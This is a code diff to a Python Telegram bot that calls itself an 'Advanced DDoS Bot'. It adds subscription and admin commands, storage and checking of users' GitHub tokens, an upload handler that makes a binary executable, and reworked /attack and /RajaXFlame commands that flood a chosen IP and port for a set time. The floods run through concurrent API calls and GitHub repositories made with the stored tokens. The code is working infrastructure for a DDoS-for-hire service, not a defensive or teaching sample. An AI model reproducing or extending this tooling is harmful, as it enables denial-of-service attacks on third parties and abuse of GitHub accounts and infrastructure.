@@ -589,8 +589,166 @@ async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
         reply_markup=reply_markup
     )
 
-# [Previous handlers for settoken, users, check, add, remove, addadmin, removeadmin, threads, setconcurrent, file, on_document remain the same]
-# ... (keeping the same implementation for these handlers to save space)
+# ---------------- Missing Handlers ----------------
+async def cmd_settoken(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    uid = update.effective_user.id
+    if not is_user_approved(uid):
+        await update.message.reply_text(f"❌ You are not authorised. Contact {DEVELOPER_TAG}")
+        return
+        
+    if not context.args:
+        await update.message.reply_text("💡 Usage: /settoken YOUR_GITHUB_TOKEN")
+        return
+        
+    token = context.args[0]
+    
+    if not validate_github_token(token):
+        await update.message.reply_text("❌ Invalid GitHub token. Please check and try again.")
+        return
+        
+    save_token_line(uid, token)
+    await update.message.reply_text("✅ GitHub token added successfully!")
+
+async def cmd_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    uid = update.effective_user.id
+    if not is_admin(uid):
+        await update.message.reply_text(f"❌ You are not authorised. Contact {DEVELOPER_TAG}")
+        return
+        
+    users = get_users()
+    if not users:
+        await update.message.reply_text("📝 No users found.")
+        return
+        
+    user_list = "👥 **User List:**\n\n"
+    now = datetime.utcnow()
+    
+    for user_id, info in users.items():
+        try:
+            expires = datetime.fromisoformat(info["expires"].replace("Z", "+00:00"))
+            remaining = expires - now
+            days_left = max(0, remaining.days)
+            status = "✅" if days_left > 0 else "❌"
+            user_list += f"{status} User {user_id}: {days_left} days left\n"
+        except Exception:
+            user_list += f"❓ User {user_id}: Invalid date\n"
+            
+    await update.message.reply_text(user_list)
+
+async def cmd_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    uid = update.effective_user.id
+    if not is_admin(uid):
+        await update.message.reply_text(f"❌ You are not authorised. Contact {DEVELOPER_TAG}")
+        return
+        
+    tokens = load_all_token_lines()
+    if not tokens:
+        await update.message.reply_text("📝 No tokens found.")
+        return
+        
+    valid_count = 0
+    total_count = len(tokens)
+    token_status = "🔑 **Token Status:**\n\n"
+    
+    for token_line in tokens:
+        try:
+            user_id, token = token_line.split(":", 1)
+            if validate_github_token(token):
+                valid_count += 1
+                token_status += f"✅ User {user_id}: Valid\n"
+            else:
+                token_status += f"❌ User {user_id}: Invalid\n"
+        except Exception:
+            token_status += f"❓ Invalid token format\n"
+            
+    token_status += f"\n📊 Summary: {valid_count}/{total_count} valid tokens"
+    await update.message.reply_text(token_status)
+
+async def cmd_add(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    uid = update.effective_user.id
+    if not is_admin(uid):
+        await update.message.reply_text(f"❌ You are not authorised. Contact {DEVELOPER_TAG}")
+        return
+        
+    if len(context.args) != 2:
+        await update.message.reply_text("💡 Usage: /add USER_ID DAYS")
+        return
+        
+    try:
+        user_id = int(context.args[0])
+        days = int(context.args[1])
+        add_user(user_id, days)
+        await update.message.reply_text(f"✅ User {user_id} added for {days} days.")
+    except ValueError:
+        await update.message.reply_text("❌ Invalid user ID or days.")
+
+async def cmd_remove(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    uid = update.effective_user.id
+    if not is_admin(uid):
+        await update.message.reply_text(f"❌ You are not authorised. Contact {DEVELOPER_TAG}")
+        return
+        
+    if not context.args:
+        await update.message.reply_text("💡 Usage: /remove USER_ID")
+        return
+        
+    try:
+        user_id = int(context.args[0])
+        remove_user(user_id)
+        await update.message.reply_text(f"✅ User {user_id} removed.")
+    except ValueError:
+        await update.message.reply_text("❌ Invalid user ID.")
+
+async def cmd_addadmin(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    uid = update.effective_user.id
+    if not is_owner(uid):
+        await update.message.reply_text(f"❌ Only owner can add admins.")
+        return
+        
+    if not context.args:
+        await update.message.reply_text("💡 Usage: /addadmin USER_ID")
+        return
+        
+    try:
+        user_id = int(context.args[0])
+        add_admin(user_id)
+        await update.message.reply_text(f"✅ User {user_id} added as admin.")
+    except ValueError:
+        await update.message.reply_text("❌ Invalid user ID.")
+
+async def cmd_removeadmin(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    uid = update.effective_user.id
+    if not is_owner(uid):
+        await update.message.reply_text(f"❌ Only owner can remove admins.")
+        return
+        
+    if not context.args:
+        await update.message.reply_text("💡 Usage: /removeadmin USER_ID")
+        return
+        
+    try:
+        user_id = int(context.args[0])
+        remove_admin(user_id)
+        await update.message.reply_text(f"✅ User {user_id} removed from admins.")
+    except ValueError:
+        await update.message.reply_text("❌ Invalid user ID.")
+
+async def cmd_threads(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    uid = update.effective_user.id
+    if not is_admin(uid):
+        await update.message.reply_text(f"❌ You are not authorised. Contact {DEVELOPER_TAG}")
+        return
+        
+    if not context.args:
+        await update.message.reply_text("💡 Usage: /threads NUMBER")
+        return
+        
+    try:
+        threads = int(context.args[0])
+        set_default_threads(threads)
+        await update.message.reply_text(f"✅ Default threads set to {threads}.")
+    except ValueError:
+        await update.message.reply_text("❌ Invalid number.")
 
 async def cmd_setconcurrent(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
@@ -616,6 +774,32 @@ combined with GitHub actions for maximum power!
         await update.message.reply_text(success_text)
     except ValueError:
         await update.message.reply_text("❌ Invalid number. Please use a valid integer.")
+
+async def cmd_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    uid = update.effective_user.id
+    if not is_admin(uid):
+        await update.message.reply_text(f"❌ You are not authorised. Contact {DEVELOPER_TAG}")
+        return
+        
+    await update.message.reply_text("📁 Please upload the binary file now...")
+
+async def on_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    uid = update.effective_user.id
+    if not is_admin(uid):
+        return
+        
+    document = update.message.document
+    if not document:
+        return
+        
+    file = await context.bot.get_file(document.file_id)
+    
+    try:
+        await file.download_to_drive(BINARY_PATH)
+        os.chmod(BINARY_PATH, 0o755)
+        await update.message.reply_text("✅ Binary uploaded and made executable!")
+    except Exception as e:
+        await update.message.reply_text(f"❌ Error uploading file: {str(e)}")
 
 async def cmd_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
@@ -739,49 +923,12 @@ async def cmd_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
 • Duration: {duration}s
 • Total Power: {len(repos) * 7 + successful_api}
 
-🔥 Attack in progress...
+💡 Attack will run until {until.strftime('%H:%M:%S UTC')}
     """.strip()
     
     await progress_msg.edit_text(success_text)
 
-    # Progress updates
-    total = int(duration)
-    for i in range(1, 6):
-        await asyncio.sleep(total // 5)
-        progress = PROGRESS_BARS[i * 2]
-        try:
-            await progress_msg.edit_text(f"🔥 Attacking... {progress} {i*20}%")
-        except Exception:
-            pass
-
-    # Cleanup and completion
-    for token, full_name in repos:
-        try:
-            gh_delete_repo(token, full_name)
-        except Exception:
-            pass
-            
-    set_status(chat_id, False, None, [])
-    
-    completion_text = f"""
-🎯 **ATTACK COMPLETED**
-
-✅ Mission accomplished!
-• Duration: {duration}s
-• GitHub Repos: {len(repos)}
-• API Calls: {successful_api}
-• Failed: {len(failed_tokens)}
-
-💫 Ready for next target!
-    """.strip()
-    
-    try:
-        await progress_msg.edit_text(completion_text)
-    except Exception:
-        await update.message.reply_text(completion_text)
-
-async def cmd_rajaxflame(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Enhanced API-only attack with professional UI"""
+async def cmd_RajaXFlame(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     chat_id = update.effective_chat.id
     
@@ -803,34 +950,21 @@ async def cmd_rajaxflame(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     concurrent = get_concurrent()
+    attack_stats = create_attack_stats(ip, port, duration, 0, concurrent)
+    await update.message.reply_text(attack_stats)
     
-    # Show attack preview
-    preview_text = f"""
-{BANNERS['api']}
-
-🎯 **API-Only Attack Preview**
-• Target: {ip}:{port}
-• Duration: {duration}s
-• Concurrent: {concurrent}
-• Total Power: {concurrent} API calls
-
-💡 Starting pure API attack...
-    """.strip()
-    
-    await update.message.reply_text(preview_text)
-    
-    # Progress animation
     progress_steps = [
-        "Initializing API connections...",
-        "Configuring attack parameters...",
-        "Starting concurrent calls...",
+        "Initializing API calls...",
+        "Setting up connections...",
+        "Sending attack requests...",
         "Launching API barrage...",
-        "Attack deployed! 🔥"
+        "Attack in progress...",
+        "API Attack Live! 🔥"
     ]
     
-    msg = await advanced_progress(context, chat_id, "PURE API ATTACK", progress_steps, 0.7)
+    progress_msg = await advanced_progress(context, chat_id, "API ATTACK", progress_steps, 0.7)
     
-    # Execute API attacks
+    # Start API attacks
     api_tasks = []
     for i in range(concurrent):
         api_tasks.append(asyncio.create_task(
@@ -841,7 +975,7 @@ async def cmd_rajaxflame(update: Update, context: ContextTypes.DEFAULT_TYPE):
     successful_api = sum(1 for r in api_results if r is True)
 
     if successful_api == 0:
-        await msg.edit_text("❌ API attack failed: All calls failed")
+        await progress_msg.edit_text("❌ API attack failed: No successful calls")
         return
 
     # Update stats
@@ -849,96 +983,68 @@ async def cmd_rajaxflame(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     # Set status
     until = datetime.utcnow() + timedelta(seconds=int(duration) + 10)
-    set_status(chat_id, True, until, [], "API-Only")
+    set_status(chat_id, True, until, [], "API")
     
-    launched_text = f"""
+    success_text = f"""
 ✅ **API ATTACK LAUNCHED**
 
 {BANNERS['api']}
 
-⚡ Pure API Power Activated!
-• Successful: {successful_api}/{concurrent}
-• Target: {ip}:{port}  
-• Duration: {duration}s
-• Type: API-Only Barrage
-
-🔥 Sending API requests...
-    """.strip()
-    
-    await msg.edit_text(launched_text)
-
-    # Progress updates
-    total = int(duration)
-    for i in range(1, 6):
-        await asyncio.sleep(total // 5)
-        progress = PROGRESS_BARS[i * 2]
-        try:
-            await msg.edit_text(f"🔥 API Barrage... {progress} {i*20}%")
-        except Exception:
-            pass
-
-    # Completion
-    set_status(chat_id, False, None, [])
-    
-    completion_text = f"""
-🎯 **API ATTACK COMPLETED**
-
-✅ Mission accomplished!
-• Duration: {duration}s
-• API Calls: {successful_api}/{concurrent}
+📊 API Deployment:
+• Successful Calls: {successful_api}/{concurrent}
 • Target: {ip}:{port}
-• Status: ✅ Success
+• Duration: {duration}s
+• Total Power: {successful_api}
 
-💫 Ready for next API strike!
+💡 API attack will run until {until.strftime('%H:%M:%S UTC')}
     """.strip()
     
-    try:
-        await msg.edit_text(completion_text)
-    except Exception:
-        await update.message.reply_text(completion_text)
+    await progress_msg.edit_text(success_text)
 
-# ---- Enhanced Application Builder ----
+# ---------------- Application Builder ----------------
 def build_app():
-    app = ApplicationBuilder().token(BOT_TOKEN).build()
-    
-    # Command handlers
-    app.add_handler(CommandHandler("start", cmd_start))
-    app.add_handler(CommandHandler("help", cmd_help))
-    app.add_handler(CommandHandler("ping", cmd_ping))
-    app.add_handler(CommandHandler("status", cmd_status))
-    app.add_handler(CommandHandler("settoken", cmd_settoken))
-    app.add_handler(CommandHandler("attack", cmd_attack))
-    app.add_handler(CommandHandler("RajaXFlame", cmd_rajaxflame))
-    app.add_handler(CommandHandler("users", cmd_users))
-    app.add_handler(CommandHandler("check", cmd_check))
-    app.add_handler(CommandHandler("add", cmd_add))
-    app.add_handler(CommandHandler("remove", cmd_remove))
-    app.add_handler(CommandHandler("addadmin", cmd_addadmin))
-    app.add_handler(CommandHandler("removeadmin", cmd_removeadmin))
-    app.add_handler(CommandHandler("threads", cmd_threads))
-    app.add_handler(CommandHandler("setconcurrent", cmd_setconcurrent))
-    app.add_handler(CommandHandler("file", cmd_file))
-    
-    # Callback and message handlers
-    app.add_handler(CallbackQueryHandler(on_button))
-    app.add_handler(MessageHandler(filters.Document.ALL, on_document))
-    
-    return app
-
-if __name__ == "__main__":
+    # Configure logging
     logging.basicConfig(
-        level=logging.INFO,
-        format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
-        datefmt="%Y-%m-%d %H:%M:%S"
+        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+        level=logging.INFO
     )
     
-    print(f"""
-{BANNERS['main']}
-🚀 Starting Advanced DDoS Bot...
-💫 Professional UI Enabled
-⚡ Mixed Attack System Ready
-🔧 Developer: {DEVELOPER_TAG}
-    """)
+    # Build application
+    application = ApplicationBuilder().token(BOT_TOKEN).build()
+    
+    # Add handlers
+    application.add_handler(CommandHandler("start", cmd_start))
+    application.add_handler(CommandHandler("help", cmd_help))
+    application.add_handler(CommandHandler("ping", cmd_ping))
+    application.add_handler(CommandHandler("status", cmd_status))
+    
+    # Add the missing handlers
+    application.add_handler(CommandHandler("settoken", cmd_settoken))
+    application.add_handler(CommandHandler("users", cmd_users))
+    application.add_handler(CommandHandler("check", cmd_check))
+    application.add_handler(CommandHandler("add", cmd_add))
+    application.add_handler(CommandHandler("remove", cmd_remove))
+    application.add_handler(CommandHandler("addadmin", cmd_addadmin))
+    application.add_handler(CommandHandler("removeadmin", cmd_removeadmin))
+    application.add_handler(CommandHandler("threads", cmd_threads))
+    application.add_handler(CommandHandler("setconcurrent", cmd_setconcurrent))
+    application.add_handler(CommandHandler("file", cmd_file))
+    
+    application.add_handler(CommandHandler("attack", cmd_attack))
+    application.add_handler(CommandHandler("RajaXFlame", cmd_RajaXFlame))
+    
+    application.add_handler(CallbackQueryHandler(on_button))
+    application.add_handler(MessageHandler(filters.Document.ALL, on_document))
+    
+    return application
+
+# ---------------- Main Entry Point ----------------
+if __name__ == "__main__":
+    print(BANNERS["main"])
+    print("\n🚀  Starting Advanced DDoS Bot...")
+    print("💫  Professional UI Enabled")
+    print("⚡  Mixed Attack System Ready")
+    print(f"🔧  Developer: {DEVELOPER_TAG}\n")
     
     app = build_app()
     app.run_polling()
